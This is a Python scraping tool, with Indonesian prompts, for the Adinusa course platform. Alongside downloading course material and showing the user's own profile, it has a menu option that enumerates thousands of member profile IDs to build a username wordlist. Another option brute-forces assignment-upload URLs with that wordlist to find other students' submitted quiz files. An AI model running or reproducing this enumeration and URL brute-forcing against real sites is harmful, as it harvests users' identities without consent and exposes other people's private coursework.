from bs4 import BeautifulSoup as bs
import re
import requests
import os
import sys
from getpass import getpass
import concurrent.futures


s = requests.session()
list_materi = []
link_tugas = ""

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://adinusa.id',
    'Connection': 'keep-alive',
    'Referer': 'https://adinusa.id/accounts/login/?navbar=hidden&next=https%3A//course.adinusa.id/login',
    'Upgrade-Insecure-Requests': '1',
}

def create_bs(link):
  global headers
  content = bs(s.get(link, headers=headers).text, 'html.parser')
  return content

# get csrf token for login
def login():
	global headers
	print("[ login dulu ]")
	username = input("masukkan username : ")
	password = getpass("masukkan password : ")


	loginpage = create_bs('https://adinusa.id/accounts/login/')
	csrf = loginpage.find('input', {'name':'csrfmiddlewaretoken'})['value']

	data = {
	  'csrfmiddlewaretoken': csrf,
	  'username': username,
	  'password': password
	}

	response = s.post('https://adinusa.id/accounts/login/',headers=headers, data=data)
	if re.search('Masukkan nama pengguna email dan sandi yang benar', response.text):
		print('Gagal login!\n')
		login()
	else:
		menu()


#function get data user
def get_info_user():
  global headers #change this 
  profil_page = create_bs('https://adinusa.id/accounts/profile/')
  #data profil
  nama = profil_page.find('div',{'class','user_name'}).find('div').text
  username = profil_page.find('div',{'class','user_name'}).find('span').text
  email = profil_page.findAll('li', {'class':'list-group-item'})[0].find('span').text
  nomer = profil_page.findAll('li', {'class':'list-group-item'})[1].find('span').text
  cv = "https://adinusa.id" + profil_page.findAll('li', {'class':'list-group-item'})[2].find('a')['href']

  #data tambahan
  profil_extra = profil_page.findAll('div', {'class':'col-md-6'})

  linkedin = profil_extra[0].findAll('a')[0].text
  github = profil_extra[0].findAll('a')[1].text
  web = profil_extra[0].findAll('a')[2].text
  youtube = profil_extra[0].findAll('a')[3].text

  facebook = profil_extra[1].findAll('a')[0].text
  instagram = profil_extra[1].findAll('a')[1].text
  twitter = profil_extra[1].findAll('a')[2].text
  telegram = profil_extra[1].findAll('a')[3].text

  data = f"""
  [ Data Profil ]
    nama     = {nama}
    username = {username}
    email    = {email}
    ponsel   = {nomer}
    cv       = {cv}

  [ Data Tambahan ]
    linkedin  = {linkedin}
    git repo  = {github}
    blog/web  = {web}
    youtube   = {youtube}
    facebook  = {facebook}
    instagram = {instagram}
    twitter   = {twitter}
    telegram  = {telegram}
  """

  print(data)
  menu()

def get_list_materi_user(tampilkan = True):
  global list_materi

  materi_page = create_bs('https://course.adinusa.id/courses/')
  for materi in materi_page.findAll('div',{'class':'flex-1 w-5/6'}):
    link = materi.a['href']
    judul = materi.h2.text
    status = materi.span.text
    batch = materi.findAll('span')[2].text

    list_materi.append({'link':link, 'judul':judul, 'batch':batch, 'status':status})

    data = f"""
    judul : {judul}[{status}]
    batch : {batch}
    ===========================
    """
    if tampilkan:
      print(data)
  menu()

def get_all_materi(): #with pilihan 1,2,3,4,
	for materi, key in zip(list_materi, range(len(list_materi))):
		print(f"{key}). ",materi['judul'])

	choice = int(input('pilih materi by id : '))
	if choice > len(list_materi):
		print('gak boleh melebihi data')
	else:
		link = 'https://course.adinusa.id' + list_materi[choice]['link']
		base_dir = link.split('/')[-1]
		content = create_bs(link)
		link_materi_pertama = "https://course.adinusa.id" + content.findAll('div', {'class':'my-4'})[1].a['href']

		page_first = create_bs(link_materi_pertama)

		# get list all materi bab + subab
		all_links_bab = []
		for bab in page_first.findAll('div', {'class': re.compile(r'ukordion$')}):
			for subbab in bab.findAll('a')[1:]:
			  all_links_bab.append("https://course.adinusa.id" + subbab['href'])

		# cek apa folder materi ada   
		if not os.path.exists(base_dir):
			os.mkdir(base_dir)
		# create index.html
		html = "<html><head><title> List Modul </title></head><body><ul><h1> List Materi </h1>"

		# proses download materi
		for link in all_links_bab:
			content = create_bs(link)
			if content.find('div',{'role':'alert'}):
			  content.find('div',{'role':'alert'}).decompose()
			content = str(content).replace('src="/static','src="https://course.adinusa.id/static')
			content = content.replace('href="/static','href="https://course.adinusa.id/static')
			content = content.replace('src="/media','src="https://course.adinusa.id/media')
			nama = link.split('/')[-1]
			open(base_dir + '/' + nama + ".html", 'w+').write(content)

			#buat create index
			html += f'<li><a href="{nama}.html">{nama}</a></li>'

		# create index.html
		html += "</ul></body></html"
		open(base_dir + '/index.html', 'w+').write(html)

		#coba save as zip
		os.system(f'zip -r {base_dir}.zip {base_dir}')
		get_all_materi() #change this oke ?

def get_user(user_id):
    try:
      content = bs(requests.get(f'https://course.adinusa.id/forum/member/profile/{user_id}/').text, 'html.parser')
      username = content.find('div',{'class':'profile-username'}).text.strip()
      print('[Found]', username)
      return username
    except:
      print('[Failed]')

def get_all_user():
  list_username = []
  futures = []
  start = 1
  end = 4000

  input_manual = input('custom user id (y/N)? (default 1-4000)')
  if input_manual.lower() == 'y':
    start = int(input('start user id : '))
    end = int(input('end user id : '))

  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    for user_id in range(start, end):
      futures.append(executor.submit(get_user, user_id))

    for future in futures:
      if future.result():
        list_username.append(future.result())


  print("\nlist user yang di dapatkan : ",len(list_username))
  with open('wordlist','w') as f:
    for i in list_username:
      f.write(i + "\n")

def cek_tugas(username):
  global link_tugas

  #preprocessing data
  username = username.strip()
  m = re.split(r'/([A-Za-z0-9.-]+)_', link_tugas)
  newlink_tugas = m[0] + '/' + username + '_'+m[2]

  content = s.get(newlink_tugas)
  if content.status_code == 200:
    print("[found]", newlink_tugas)

def proses_cek_tugas():
  global link_tugas
  
  wordlist = open('wordlist').readlines()
  custom_wordlist = input('mau menggunakan custom wordlist ? (y/N) ')
  if custom_wordlist.lower() == 'y':
    nama_file = input('masukkan nama file wordlist : ')
    wordlist = open(nama_file).readlines()

  link_tugas = input(' [note]\n masukan link tugas yang pernah di upload di course target\n contoh :  https://course.adinusa.id/media/uploads/username_210_quiz2.zip\n link target : ')

  with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(cek_tugas, wordlist)
  menu()



def menu():
    print(""" 
      ┌──────────────┐
      │ Adinusa Tool │
      └──────────────┘
     1. cek semua list materi
     2. download materi
     3. cek informasi profil
     4. buat wordlist dari semua user adinusa
     5. bruteforce link tugas""")
    menu = input("masukan pilihan : ")

    if menu == '1':
    	get_list_materi_user()
    elif menu == '2':
    	get_list_materi_user(False)
    	get_all_materi()
    elif menu == '3':
    	get_info_user()
    elif menu == '4':
      get_all_user()
    elif menu == '5':
      proses_cek_tugas()
    else:
    	print('ngapain ?')
    	menu() 
  
if __name__ == "__main__":
  try:
  	login()
  except KeyboardInterrupt:
    print('\nGood bye /ᐠ｡ꞈ｡ᐟ\\')
    sys.exit()


